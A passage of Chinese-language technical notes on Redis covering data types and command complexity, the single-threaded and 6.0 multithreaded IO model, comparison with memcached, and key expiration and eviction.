<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><p>集合（<code>set</code>）可以保存多个字符串元素，但是不允许有重复元素，并且集合中的元素是无序的，一个集合最多可以存储<code>2^32-1</code>个元素，集合可以进行内部的增删改查和多个集合取交集，并集，差集。</p>
<p>主要的应用有：标签，生成随机数（抽奖），社交需求（共同好友，粉丝等等）</p>
<p>内部编码主要有：</p>
<ul>
<li><code>intset</code>(<strong>整数集合</strong>)：当集合中的元素都是整数而且元素个数小于<code>set-max-intset-entries</code>配置（默认512个）时，使用该编码减少内存的使用</li>
<li><code>hashtable</code>(<strong>哈希表</strong>)：其它条件下使用哈希表作为内部实现</li>
</ul>
<h3 id="各个指令的时间复杂度-3"><a href="#各个指令的时间复杂度-3" class="headerlink" title="各个指令的时间复杂度"></a>各个指令的时间复杂度</h3><ul>
<li><strong>SADD</strong>：向指定 Set 中添加 1 个或多个 member，如果指定 Set 不存在，会自动创建一个。时间复杂度 <code>O(N)</code>，N 为添加的 member 个数</li>
<li><strong>SREM</strong>：从指定 Set 中移除 1 个或多个 member，时间复杂度 <code>O(N)</code>，N 为移除的 member 个数</li>
<li><strong>SRANDMEMBER</strong>：从指定 Set 中随机返回 1 个或多个 member，时间复杂度 <code>O(N)</code>，N 为返回的 member 个数</li>
<li><strong>SPOP</strong>：从指定 Set 中随机移除并返回 count 个 member，时间复杂度 <code>O(N)</code>，N 为移除的 member 个数</li>
<li><strong>SCARD</strong>：返回指定 Set 中的 member 个数，时间复杂度 <code>O(1)</code></li>
<li><strong>SISMEMBER</strong>：判断指定的 value 是否存在于指定 Set 中，时间复杂度 <code>O(1)</code></li>
<li><strong>SMOVE</strong>：将指定 member 从一个 Set 移至另一个 Set</li>
</ul>
<p>慎用的Set相关命令：</p>
<ul>
<li><strong>SMEMBERS</strong>：返回指定 Hash 中所有的 member，时间复杂度 <code>O(N)</code></li>
<li><strong>SUNION/SUNIONSTORE</strong>：计算多个 Set 的并集并返回/存储至另一个 Set 中，时间复杂度 <code>O(N)</code>，N 为参与计算的所有集合的总 member 数</li>
<li><strong>SINTER/SINTERSTORE</strong>：计算多个 Set 的交集并返回/存储至另一个 Set 中，时间复杂度 <code>O(N)</code>，N 为参与计算的所有集合的总 member 数</li>
<li><strong>SDIFF/SDIFFSTORE</strong>：计算 1 个 Set 与 1 或多个 Set 的差集并返回/存储至另一个 Set 中，时间复杂度 <code>O(N)</code>，N 为参与计算的所有集合的总 member 数</li>
</ul>
<p>上述几个命令涉及的计算量大，应谨慎使用，特别是在参与计算的 Set 尺寸不可知的情况下，应严格避免使用。可以考虑通过 SSCAN 命令遍历获取相关 Set 的全部 member，如果需要做并集/交集/差集计算，可以在客户端进行，或在不服务实时查询请求的 Slave 上进行</p>
<h2 id="ZSet"><a href="#ZSet" class="headerlink" title="ZSet"></a>ZSet</h2><p>有序集合（<code>zset</code>）保留集合元素不能重复的特性，但是有序集合中的元素可以排序，它为每一个元素设定一个score作为排序的依据</p>
<p>应用：排行榜系统，用户点赞。需要对数据根据某个权重进行排序的场景。比如在直播系统中，实时排行信息包含直播间在线用户列表，各种礼物排行榜，弹幕消息（可以理解为按消息维度的消息排行榜）等信息。</p>
<p>内部编码实现：</p>
<ul>
<li><code>ziplist</code>(<strong>压缩列表</strong>)：当哈希类型元素个数小于<code>zset-max-ziplist-entries</code>配置（默认128个），同时所有值小于<code>zset-max-ziplist-value</code>配置（默认64）时，使用<code>ziplist</code>作为内部实现，<code>ziplist</code>使用更加紧凑的结构实现多个元素的连续存储，在节省内存方面更加优秀。</li>
<li><code>skiplist</code>(<strong>跳表</strong>)：当<code>ziplist</code>条件不满足时，有序集合会使用<code>skiplist</code>作为内部实现，因为此时<code>ziplist</code>的读写效率会下降</li>
</ul>
<h3 id="各个指令的时间复杂度-4"><a href="#各个指令的时间复杂度-4" class="headerlink" title="各个指令的时间复杂度"></a>各个指令的时间复杂度</h3><ul>
<li><strong>ZADD</strong>：向指定 Sorted Set 中添加 1 个或多个 member，时间复杂度 <code>O(Mlog(N))</code>，M 为添加的 member 数量，N 为 Sorted Set 中的 member 数量</li>
<li><strong>ZREM</strong>：从指定 Sorted Set 中删除 1 个或多个 member，时间复杂度 <code>O(Mlog(N))</code>，M 为删除的 member 数量，N 为 Sorted Set 中的 member 数量</li>
<li><strong>ZCOUNT</strong>：返回指定 Sorted Set 中指定 score 范围内的 member 数量，时间复杂度：<code>O(log(N))</code></li>
<li><strong>ZCARD</strong>：返回指定 Sorted Set 中的 member 数量，时间复杂度 <code>O(1)</code></li>
<li><strong>ZSCORE</strong>：返回指定 Sorted Set 中指定 member 的 score，时间复杂度 <code>O(1)</code></li>
<li><strong>ZRANK/ZREVRANK</strong>：返回指定 member 在 Sorted Set 中的排名，ZRANK 返回按升序排序的排名，ZREVRANK 则返回按降序排序的排名。时间复杂度 <code>O(log(N))</code></li>
<li><strong>ZINCRBY</strong>：同 INCRBY，对指定 Sorted Set 中的指定 member 的 score 进行自增，时间复杂度 <code>O(log(N))</code></li>
</ul>
<p>慎用的Sorted Set相关命令：</p>
<ul>
<li><strong>ZRANGE/ZREVRANGE</strong>：返回指定 Sorted Set 中指定排名范围内的所有 member，ZRANGE 为按 score 升序排序，ZREVRANGE 为按 score 降序排序，时间复杂度 <code>O(log(N)+M)</code>，M为本次返回的 member 数</li>
<li><strong>ZRANGEBYSCORE/ZREVRANGEBYSCORE</strong>：返回指定 Sorted Set 中指定 score 范围内的所有 member，返回结果以升序/降序排序，min 和 max 可以指定为 -inf和+ inf，代表返回所有的 member。时间复杂度 <code>O(log(N)+M)</code></li>
<li><strong>ZREMRANGEBYRANK/ZREMRANGEBYSCORE</strong>：移除 Sorted Set 中指定排名范围/指定 score 范围内的所有 member。时间复杂度 <code>O(log(N)+M)</code></li>
</ul>
<p>上述几个命令，应尽量避免传递 <code>[0 -1]</code> 或 <code>[-inf +inf]</code> 这样的参数，来对 Sorted Set 做一次性的完整遍历，特别是在 Sorted Set 的尺寸不可预知的情况下。可以通过 ZSCAN 命令来进行游标式的遍历，或通过 LIMIT 参数来限制返回 member 的数量（适用于 ZRANGEBYSCORE 和 ZREVRANGEBYSCORE 命令），以实现游标式的遍历。</p>
<h2 id="Bitmaps"><a href="#Bitmaps" class="headerlink" title="Bitmaps"></a>Bitmaps</h2><p>计算机使用二进制位（位）作为信息的基础单位，1个字节等于8位，Redis 提供 Bitmaps 可以实现对位的操作。Bitmaps 本身不是一种数据结构，实际上它是字符串，但可以对字符串的位进行操作</p>
<p>可以把 Bitmaps 看成一个以位为单位的数组，数组的每个单元只能存储 0 和 1，数组的下标在 Bitmaps 中叫做偏移量</p>
<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><ul>
<li><code>setbit key offset value</code>：设置键的第 offset 个位的值</li>
<li><code>getbit key offset</code>：获取值</li>
<li><code>bitcount [start][end]</code>：获取 Bitmaps 指定范围值为 1 的个数,其中 start 和 end 代表起始和结束字节数（一个字节占8位，例如start=2表示从下标16开始算）</li>
</ul>
<p>Bitmaps 间的运算：</p>
<ul>
<li><code>bitop op destkey key[key …]</code>：op可以是and（交集），or（并集），not（非），xor（异或）操作， 操作结果保存在 deskey 中</li>
<li><code>bitpos key targetBit [start][end]</code>:计算 Bitmaps 中第一个值为targetBit的偏移量</li>
</ul>
<p>应用场景：<br>当用户量很大时，用来记录当天访问人数，可以大幅度减少内存</p>
<h2 id="HyperLogLog"><a href="#HyperLogLog" class="headerlink" title="HyperLogLog"></a>HyperLogLog</h2><p>HyperLogLog 实际类型为字符串类型，它是一种基数算法，可以利用极小的内存空间独立完成总数的统计</p>
<ul>
<li><code>pfadd key element [element …]</code>：添加</li>
<li><code>pfcount key [key …]</code>：计算独立用户数</li>
<li><code>pfmerge destkey sourcekey [sourcekey …]</code>：合并:求出多个 HyperLogLog 的并集并赋值给 deskey</li>
</ul>
<p>HyperLogLog 内存占用量非常小，但是存在错误率</p>
<h1 id="2-为什么要用redis-为什么要用缓存"><a href="#2-为什么要用redis-为什么要用缓存" class="headerlink" title="2. 为什么要用redis/为什么要用缓存"></a>2. 为什么要用redis/为什么要用缓存</h1><p>主要从“高性能”和“高并发”这两个点来看待这个问题</p>
<p><strong>高性能</strong>：</p>
<p>Redis中的数据是存储在内存中的，所以读写速度非常快。假如用户第一次访问数据库中的某些数据，这个过程会比较慢，因为是从硬盘上读取的。将该用户访问的数据存在缓存中，这样下一次再访问这些数据的时候就可以直接从缓存中获取了。操作缓存就是直接操作内存，所以速度相当快。如果数据库中的对应数据改变之后，同步改变缓存中相应的数据即可。</p>
<p><strong>高并发</strong>：</p>
<p>一般像 MySQL 这类的数据库的 QPS 大概都在 1w 左右（4 核 8g） ，但是使用 Redis 缓存之后很容易达到 10w+，甚至最高能达到 30w+（就单机 redis 的情况，redis 集群的话会更高）。</p>
<blockquote>
<p>QPS（Query Per Second）：服务器每秒可以执行的查询次数；</p>
</blockquote>
<p>直接操作缓存能够承受的请求是远远大于直接访问数据库的，所以可以考虑把数据库中的部分数据转移到缓存中去，这样用户的一部分请求会直接到缓存这里而不用经过数据库</p>
<h1 id="3-为什么使用redis而不直接在程序中使用map-guava做缓存？"><a href="#3-为什么使用redis而不直接在程序中使用map-guava做缓存？" class="headerlink" title="3. 为什么使用redis而不直接在程序中使用map/guava做缓存？"></a>3. 为什么使用redis而不直接在程序中使用map/guava做缓存？</h1><p>缓存分为本地缓存和分布式缓存，以Java为例，使用自带得<code>map</code>或者<code>guava</code>实现的是本地缓存，最主要得特点是<strong>轻量以及快速</strong>，生命周期随着JVM的销毁而结束，并且在多实例的情况下，每个实例都需要各自保存一份缓存，<strong>缓存不具有一致性</strong>。</p>
<p>使用<code>redis</code>或<code>memcached</code>之类的称为分布式缓存，在多实例的情况下，各实例共用一份缓存数据，缓存具有一致性。缺点是需要保持<code>redis</code>或<code>memcached</code>服务的高可用，整个程序架构上较为复杂。</p>
<h1 id="4-redis的线程模型"><a href="#4-redis的线程模型" class="headerlink" title="4. redis的线程模型"></a>4. redis的线程模型</h1><p><strong>Redis 基于 Reactor 模式来设计开发了自己的一套高效的事件处理模型</strong> 。redis内部使用文件事件处理器<code>file event handler</code>,这个文件事件处理器是单线程的，所以redis才叫做单线程的模型。</p>
<p>它采用IO多路复用机制同时监听多个socket，它会将感兴趣的事件及类型（读、写）注册到内核中并监听每个事件是否发生。根据socket上的事件来选择对应的事件处理器进行处理。</p>
<p>这样的好处非常明显： <strong>I/O 多路复用技术的使用让 Redis 不需要额外创建多余的线程来监听客户端的大量连接，降低了资源的消耗</strong>（和 NIO 中的 <code>Selector</code> 组件很像）。</p>
<p>另外， Redis 服务器是一个事件驱动程序，服务器需要处理两类事件：</p>
<ol>
<li>文件事件;</li>
<li>时间事件。</li>
</ol>
<p>时间事件不需要多花时间了解，我们接触最多的还是 <strong>文件事件</strong>（客户端进行读取写入等操作，涉及一系列网络通信）。</p>
<p>《Redis 设计与实现》有一段话是如是介绍文件事件的：</p>
<blockquote>
<p>Redis 基于 Reactor 模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）。文件事件处理器使用 I/O 多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。</p>
<p>当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关 闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。</p>
<p><strong>虽然文件事件处理器以单线程方式运行，但通过使用 I/O 多路复用程序来监听多个套接字</strong>，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与 Redis 服务器中其他同样以单线程方式运行的模块进行对接，这保持了 Redis 内部单线程设计的简单性。</p>
</blockquote>
<p>文件事件处理器的结构包含4各部分：</p>
<ul>
<li>多个socket</li>
<li>IO 多路复用程序</li>
<li>文件事件分派器</li>
<li>事件处理器（连接应答处理器，命令请求处理器、命令回复处理器）</li>
</ul>
<p>多个socket可能会并发产生不同的操作，每个操作对应不同的文件事件，但是IO多路服用程序会监听多个socket，会将socket产生的事件放入队列中排队，事件分派器每次从队列中取出一个事件，把该事件交给对应的事件处理器进行处理。</p>
<p><img src="http://qiniu.xiaoming.net.cn/redis%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%99%A8.png" alt="Redis事件处理器"></p>
<p>客户端与redis的一次通信过程如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/Redis%E4%B8%80%E6%AC%A1%E9%80%9A%E8%A1%8C%E8%BF%87%E7%A8%8B.webp" alt="redis的一次通信过程"></p>
<p>客户端<code>socket01</code>向redis的<code>server socket</code>请求建立连接，此时<code>server socket</code>会产生一个<code>AE_READBLE</code>事件，IO多路复用程序监听到<code>server socket</code>产生的事件后，将该事件压入队列中。文件事件分派器从队列中获取该事件，交给连接应答处理器。连接应答处理器会创建一个能与客户端通信的<code>socket01</code>,并将该<code>socket01</code>的<code>AE_READBLE</code>事件与命令请求处理器相关联。</p>
<p>假设此时客户端发送了一个<code>set key value</code>请求，此时redis的<code>socket01</code>会产生<code>AE_READABLE</code>事件，IO多路复用程序将事件压入队列，此时事件分派器将事件交给命令请求处理器来处理。命令请求处理器读取<code>socket01</code>中的<code>key value</code>并在自己内存中完成<code>key value</code>的设置。操作完成后，它会将<code>socket01</code>的<code>AE_WRITABLE</code>事件与命令回复处理器相关联。</p>
<p>如果此时客户端准备好接收返回结果了，那么redis中的<code>socket01</code>会产生一个<code>AE_WRITABLE</code>事件，同样压入队列中，事件分派器找到相关联的的命令回复处理器，由命令回复处理器对<code>socket01</code>输入本次操作的一个结果，比如<code>ok</code>，之后解除<code>socket01</code>的<code>AE_WRITABLE</code>事件与命令回复处理器的关联。</p>
<p>这就完成了一次通信。</p>
<h1 id="5-Redis-使用单线程的原因"><a href="#5-Redis-使用单线程的原因" class="headerlink" title="5. Redis 使用单线程的原因"></a>5. Redis 使用单线程的原因</h1><p>Redis 从一开始就选择使用单线程模型处理来自客户端的绝大多数网络请求，这种考虑其实是多方面的，其中最重要的几个原因如下：</p>
<ol>
<li>使用单线程模型能带来更好的可维护性，方便开发和调试；</li>
<li>使用单线程模型也能并发的处理客户端的请求；</li>
<li>Redis 服务中运行的绝大多数操作的性能瓶颈都不是 CPU；</li>
</ol>
<p>上述三个原因中的最后一个是最终使用单线程模型的决定性因素，其他的两个原因都是使用单线程模型额外带来的好处，在这里按顺序介绍上述的几个原因。</p>
<h2 id="可维护性"><a href="#可维护性" class="headerlink" title="可维护性"></a>可维护性</h2><p>可维护性对于一个项目来说非常重要，如果代码难以调试和测试，问题也经常难以复现，这对于任何一个项目来说都会严重地影响项目的可维护性。多线程模型虽然在某些方面表现优异，但是它却引入了程序执行顺序的不确定性，代码的执行过程不再是串行的，多个线程同时访问的变量如果没有谨慎处理就会带来诡异的问题。</p>
<p>如果计算机中的两个进程（线程同理）同时尝试修改一个共享内存的内容，在没有并发控制的情况下，最终的结果依赖于两个进程的执行顺序和时机，如果发生了并发访问冲突，最后的结果就会是不正确的。</p>
<p>引入了多线程，就必须要同时引入并发控制来保证在多个线程同时访问数据时程序行为的正确性，这就需要工程师额外维护并发控制的相关代码，例如，会需要在可能被并发读写的变量上增加互斥锁。</p>
<p>在访问这些变量或者内存之前也需要先对获取互斥锁，一旦忘记获取锁或者忘记释放锁就可能会导致各种诡异的问题，管理相关的并发控制机制也需要付出额外的研发成本和负担。</p>
<h2 id="并发处理"><a href="#并发处理" class="headerlink" title="并发处理"></a>并发处理</h2><p>使用单线程模型也并不意味着程序不能并发的处理任务，Redis 虽然使用单线程模型处理用户的请求，但是它却使用 I/O 多路复用机制<strong>并发</strong>处理来自客户端的多个连接，同时等待多个连接发送的请求。</p>
<p>在 I/O 多路复用模型中，最重要的函数调用就是 <code>select</code> 以及类似函数，该方法的能够同时监控多个文件描述符（也就是客户端的连接）的可读可写情况，当其中的某些文件描述符可读或者可写时，<code>select</code> 方法就会返回可读以及可写的文件描述符个数。</p>
<p>使用 I/O 多路复用技术能够极大地减少系统的开销，系统不再需要额外创建和维护进程和线程来监听来自客户端的大量连接，减少了服务器的开发成本和维护成本。</p>
<h2 id="性能瓶颈"><a href="#性能瓶颈" class="headerlink" title="性能瓶颈"></a>性能瓶颈</h2><p>这个就是 Redis 选择单线程模型的决定性原因 —— 多线程技术能够帮助我们充分利用 CPU 的计算资源来并发的执行不同的任务，但是 CPU 资源往往都不是 Redis 服务器的性能瓶颈。哪怕在一个普通的 Linux 服务器上启动 Redis 服务，它也能在 1s 的时间内处理 1,000,000 个用户请求。</p>
<p>如果这种吞吐量不能满足我们的需求，更推荐的做法是使用分片的方式将不同的请求交给不同的 Redis 服务器来处理，而不是在同一个 Redis 服务中引入大量的多线程操作。</p>
<p>简单总结一下，Redis 并不是 CPU 密集型的服务，如果不开启 AOF 备份，所有 Redis 的操作都会在内存中完成不会涉及任何的 I/O 操作，这些数据的读写由于只发生在内存中，所以处理速度是非常快的；整个服务的瓶颈在于网络传输带来的延迟和等待客户端的数据传输，也就是网络 I/O，所以使用多线程模型处理全部的外部请求可能不是一个好的方案。</p>
<p>多线程虽然会更充分地利用 CPU 资源，但是操作系统上线程的切换也不是免费的，线程切换其实会带来额外的开销，其中包括：</p>
<ol>
<li>保存线程 1 的执行上下文；</li>
<li>加载线程 2 的执行上下文；</li>
</ol>
<p>频繁的对线程的上下文进行切换可能还会导致性能地急剧下降，这可能会导致不仅没有提升请求处理的平均速度，反而进行了负优化，所以这也是为什么 Redis 对于使用多线程技术非常谨慎。</p>
<h1 id="6-Redis-多线程"><a href="#6-Redis-多线程" class="headerlink" title="6. Redis 多线程"></a>6. Redis 多线程</h1><h2 id="Redis-4-0"><a href="#Redis-4-0" class="headerlink" title="Redis 4.0"></a>Redis 4.0</h2><p>虽然说 Redis 是单线程模型，但是， 实际上，<strong>Redis 在 4.0 之后的版本中就已经加入了对多线程的支持。</strong></p>
<p>不过，Redis 4.0 增加的多线程主要是针对一些大键值对的删除操作的命令，使用这些命令就会使用主处理之外的其他线程来“异步处理”。</p>
<p>Redis 在最新的几个版本中加入了一些可以被其他线程异步处理的删除操作，例如 <code>UNLINK</code>、<code>FLUSHALL ASYNC</code>、<code>FLUSHDB ASYNC</code> 等非阻塞的删除操作。为什么会需要这些删除操作，而它们为什么需要通过多线程的方式异步处理？</p>
<h3 id="删除操作多线程的原因"><a href="#删除操作多线程的原因" class="headerlink" title="删除操作多线程的原因"></a>删除操作多线程的原因</h3><p>可以在 Redis 在中使用 <code>DEL</code> 命令来删除一个键对应的值，如果待删除的键值对占用了较小的内存空间，那么哪怕是<strong>同步地</strong>删除这些键值对也不会消耗太多的时间。</p>
<p>但是对于 Redis 中的一些超大键值对，几十 MB 或者几百 MB 的数据并不能在几毫秒的时间内处理完，Redis 可能会需要在释放内存空间上消耗较多的时间，这些操作就会阻塞待处理的任务，影响 Redis 服务处理请求的 PCT99 和可用性。</p>
<p>然而释放内存空间的工作其实可以由后台线程异步进行处理，这也就是 <code>UNLINK</code> 命令的实现原理，它只会将键从元数据中删除，真正的删除操作会在后台异步执行。</p>
<blockquote>
<p>大体上来说，<strong>Redis 6.0 之前主要还是单线程处理。</strong></p>
</blockquote>
<h2 id="Redis6-0-之后引入了多线程"><a href="#Redis6-0-之后引入了多线程" class="headerlink" title="Redis6.0 之后引入了多线程"></a>Redis6.0 之后引入了多线程</h2><p><strong>引入多线程的原因：</strong></p>
<p>Redis将所有数据放在内存中，内存的响应时长大约为100纳秒，对于小数据包，Redis服务器可以处理80,000到100,000 QPS，这也是Redis处理的极限了，对于80%的公司来说，单线程的Redis已经足够使用了。</p>
<p>但随着越来越复杂的业务场景，有些公司动不动就上亿的交易量，因此需要更大的QPS。常见的解决方案是在分布式架构中对数据进行分区并采用多个服务器，但该方案有非常大的缺点，例如要管理的Redis服务器太多，维护代价大；某些适用于单个Redis服务器的命令不适用于数据分区；数据分区无法解决热点读/写问题；数据偏斜，重新分配和放大/缩小变得更加复杂等等。</p>
<p>从Redis自身角度来说，因为读写网络的read/write系统调用占用了Redis执行期间大部分CPU时间，瓶颈主要在于网络的 IO 消耗, 优化主要有两个方向:</p>
<ul>
<li>提高网络 IO 性能，典型的实现比如使用 DPDK 来替代内核网络栈的方式</li>
<li>使用多线程充分利用多核，典型的实现比如 Memcached。</li>
</ul>
<p>协议栈优化的这种方式跟 Redis 关系不大，支持多线程是一种最有效最便捷的操作方式。所以总结起来，redis支持多线程主要就是两个原因：</p>
<ul>
<li>可以充分利用服务器 CPU 资源，目前主线程只能利用一个核</li>
<li>多线程任务可以分摊 Redis 同步 IO 读写负荷</li>
</ul>
<p><strong>Redis6.0 引入多线程主要是为了提高网络 IO 读写性能</strong>，因为这个算是 Redis 中的一个性能瓶颈（Redis 的瓶颈主要受限于内存和网络）。</p>
<p>虽然，Redis6.0 引入了多线程，但是 Redis 的多线程只是在网络数据的读写这类耗时操作上使用了， 执行命令仍然是单线程顺序执行。因此，也<strong>不需要担心线程安全问题</strong>。</p>
<p>Redis6.0 的多线程默认是禁用的，只使用主线程。如需开启需要修改 redis 配置文件 <code>redis.conf</code> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">io-threads-do-reads yes</span><br></pre></td></tr></table></figure>

<p>开启多线程后，还需要设置线程数，否则是不生效的。同样需要修改 redis 配置文件 <code>redis.conf</code> :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">io-threads 4 #官网建议4核的机器建议设置为2或3个线程，8核的建议设置为6个线程</span><br></pre></td></tr></table></figure>

<p>关于线程数的设置，官方有一个建议：4核的机器建议设置为2或3个线程，8核的建议设置为6个线程，线程数一定要小于机器核数。还需要注意的是，线程数并不是越大越好，官方认为超过了8个基本就没什么意义了。</p>
<h2 id="Redis-多线程实现机制"><a href="#Redis-多线程实现机制" class="headerlink" title="Redis 多线程实现机制"></a>Redis 多线程实现机制</h2><p><img src="http://qiniu.xiaoming.net.cn/Redis%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%88%B6.webp" alt="Redis多线程实现机制"></p>
<p><strong>流程简述如下：</strong></p>
<ol>
<li>主线程负责接收建立连接请求，获取 socket 放入全局等待读处理队列</li>
<li>主线程处理完读事件之后，通过 RR(Round Robin) 将这些连接分配给这些 IO 线程</li>
<li>主线程阻塞等待 IO 线程读取 socket 完毕</li>
<li>主线程通过单线程的方式执行请求命令，请求数据读取并解析完成，但并不执行</li>
<li>主线程阻塞等待 IO 线程将数据回写 socket 完毕</li>
<li>解除绑定，清空等待队列</li>
</ol>
<p><img src="http://qiniu.xiaoming.net.cn/Redis%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B.webp" alt="Redis多线程实现流程"></p>
<p><strong>该设计有如下特点：</strong></p>
<ol>
<li>IO 线程要么同时在读 socket，要么同时在写，不会同时读或写</li>
<li>IO 线程只负责读写 socket 解析命令，不负责命令处理</li>
</ol>
<h1 id="7-redis和memcached的区别"><a href="#7-redis和memcached的区别" class="headerlink" title="7. redis和memcached的区别"></a>7. redis和memcached的区别</h1><h2 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h2><ol>
<li>都是基于内存的数据库，一般都用来当做缓存使用。</li>
<li>都有过期策略。</li>
<li>两者的性能都非常高。</li>
</ol>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><ul>
<li><strong>Redis支持更丰富的数据类型（支持更复杂的应用场景）</strong>：Redis不仅仅支持简单的<code>k/v</code>类型的数据，同时还提供<code>list</code>,<code>hash</code>,<code>set</code>,<code>zset</code>等数据结构的存储。memcached支持简单数据类型<code>String</code>（<code>k/v</code>)。</li>
<li><strong>Redis支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用，而Memcached把数据全部存在内存之中</strong></li>
<li><strong>Redis 有灾难恢复机制。</strong> 因为可以把缓存中的数据持久化到磁盘上。</li>
<li><strong>Redis 在服务器内存使用完之后，可以将不用的数据放到磁盘上。但是，Memcached 在服务器内存使用完之后，就会直接报异常。</strong></li>
<li><strong>集群模式</strong>：memcached没有原生的集群模式，需要依靠客户端来实现往集群中分片写入数据；但是redis目前是原生支持<code>cluster</code>模式的</li>
<li><strong>Memcached是多线程的，非阻塞IO复用的网络模型；Redis使用单线程的多路复用IO模型</strong>（Redis 6.0 引入了多线程 IO ）</li>
<li><strong>Redis 支持发布订阅模型、Lua 脚本、事务等功能，而 Memcached 不支持。并且，Redis 支持更多的编程语言。</strong></li>
<li><strong>Memcached过期数据的删除策略只用了惰性删除，而 Redis 同时使用了惰性删除与定期删除。</strong></li>
</ul>
<h1 id="8-Redis-给缓存数据设置过期时间有啥用？"><a href="#8-Redis-给缓存数据设置过期时间有啥用？" class="headerlink" title="8. Redis 给缓存数据设置过期时间有啥用？"></a>8. Redis 给缓存数据设置过期时间有啥用？</h1><p>一般情况下，设置保存的缓存数据的时候都会设置一个过期时间。</p>
<p>因为内存是有限的，如果缓存中的所有数据都是一直保存的话，分分钟直接Out of memory。</p>
<p>Redis 自带了给缓存数据设置过期时间的功能，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; exp key  60 # 数据在 60s 后过期</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; setex key 60 value # 数据在 60s 后过期 (setex:[set] + [ex]pire)</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; ttl key # 查看数据还有多久过期</span><br><span class="line">(integer) 56</span><br></pre></td></tr></table></figure>

<p>注意：<strong>Redis中除了字符串类型有自己独有设置过期时间的命令 <code>setex</code> 外，其他方法都需要依靠 <code>expire</code> 命令来设置过期时间 。另外， <code>persist</code> 命令可以移除一个键的过期时间</strong></p>
<p><strong>过期时间除了有助于缓解内存的消耗，还有什么其他用么？</strong></p>
<p>很多时候，我们的业务场景就是需要某个数据只在某一时间段内存在，比如我们的短信验证码可能只在1分钟内有效，用户登录的 token 可能只在 1 天内有效。</p>
<p>如果使用传统的数据库来处理的话，一般都是自己判断过期，这样更麻烦并且性能要差很多。</p>
<h1 id="9-Redis-判断数据过期的原理"><a href="#9-Redis-判断数据过期的原理" class="headerlink" title="9. Redis 判断数据过期的原理"></a>9. Redis 判断数据过期的原理</h1><p>Redis 通过一个叫做过期字典（可以看作是hash表）来保存数据过期的时间。过期字典的键指向Redis数据库中的某个key(键)，过期字典的值是一个long long类型的整数，这个整数保存了key所指向的数据库键的过期时间（毫秒精度的UNIX时间戳）。</p>
<p><img src="http://qiniu.xiaoming.net.cn/redis%E8%BF%87%E6%9C%9F%E6%97%B6%E9%97%B4%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="Redis过期时间实现原理"></p>
<p>过期字典是存储在redisDb这个结构里的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct redisDb &#123;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    dict *dict;     &#x2F;&#x2F;数据库键空间,保存着数据库中所有键值对</span><br><span class="line">    dict *expires   &#x2F;&#x2F; 过期字典,保存着键的过期时间</span><br><span class="line">    ...</span><br><span class="line">&#125; redisDb;</span><br></pre></td></tr></table></figure>

<h1 id="10-redis过期键处理方式"><a href="#10-redis过期键处理方式" class="headerlink" title="10. redis过期键处理方式"></a>10. redis过期键处理方式</h1><p>Redis中有个设置时间过期的功能，即对存储在 redis 数据库中的值可以设置一个过期时间。作为一个缓存数据库，这是非常实用的。如一般项目中的<code>token</code> 或者一些登录信息，尤其是短信验证码都是有时间限制的，按照传统的数据库处理方式，一般都是自己判断过期，这样无疑会严重影响项目性能。</p>
<p>在<code>set key</code>的时候，都可以给一个<code>expire time</code>，就是过期时间，通过过期时间可以指定这个<code>key</code>可以存活的时间。</p>
<p>Redis对过期的键采用的删除方式是：<strong>定期删除+惰性删除</strong></p>
<ul>
<li><strong>定期删除</strong>：redis默认是每隔100ms就随机抽取一些设置了过期时间的<code>key</code>,检查其是否过期，如果过期就删除。注意这里是随机抽取的。采用随机抽取的方式是因为如果Redis存了很多<code>key</code>的话，每隔100ms就遍历所有的设置过期时间的<code>key</code>的话，就会给CPU带来很大的负载。</li>
<li><strong>惰性删除</strong>：定期删除可能会导致很多过期<code>key</code>到了时间并没有被删除掉。所以就有了惰性删除。对于过期的<code>key</code>,如果过了时间还没有被定期删除，还停留在内存中，只有在系统中查询一下这个<code>key</code>，redis才会把它给删除掉，这就是所谓的惰性删除。</li>
</ul>
<p>但是仅仅通过设置过期时间还是有问题的。如果定期删除漏掉了很多过期<code>key</code>，然后也没及时去查，也就没走惰性删除，此时会有大量过期key堆积在内存里，导致redis内存块耗尽了。redis采用<strong>内存淘汰机制</strong>进行处理。</p>
<h1 id="11-redis内存淘汰机制（MySQL中有2000w数据，Redis中只存了20w数据，如何保证Redis中的数据都是热点数据？）"><a href="#11-redis内存淘汰机制（MySQL中有2000w数据，Redis中只存了20w数据，如何保证Redis中的数据都是热点数据？）" class="headerlink" title="11. redis内存淘汰机制（MySQL中有2000w数据，Redis中只存了20w数据，如何保证Redis中的数据都是热点数据？）"></a>11. redis内存淘汰机制（MySQL中有2000w数据，Redis中只存了20w数据，如何保证Redis中的数据都是热点数据？）</h1><p>当Redis中内存使用量超出时，会施行数据淘汰策略</p>
<p>Redis支持6种淘汰策略：</p>
<ul>
<li><strong>volatile-lru</strong>：从已设置过期时间的数据集(<code>server.db[i].expires</code>)中挑选最近最少使用的数据淘汰</li>
